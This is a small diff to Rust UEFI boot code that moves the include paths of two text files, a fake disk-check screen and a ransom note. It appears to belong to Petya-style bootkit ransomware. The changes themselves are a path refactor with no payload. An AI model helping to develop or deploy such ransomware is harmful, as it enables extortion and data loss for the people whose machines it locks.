@@ -24,7 +24,7 @@ fn init_chdsk_screen(st: &mut SystemTable<Boot>) {
     st.stdout().clear().unwrap_success();
     st.stdout().enable_cursor(false).unwrap_success();
     st.stdout()
-        .write_str(include_str!("chdsk_note.txt"))
+        .write_str(include_str!("include/chdsk_note.txt"))
         .unwrap();
 }
 
@@ -35,7 +35,7 @@ fn init_ransom_screen(st: &mut SystemTable<Boot>) {
         .set_color(Color::Red, Color::Black)
         .unwrap_success();
     st.stdout()
-        .write_str(include_str!("ransom_note.txt"))
+        .write_str(include_str!("include/ransom_note.txt"))
         .unwrap();
 
     match read_file(st, "id") {
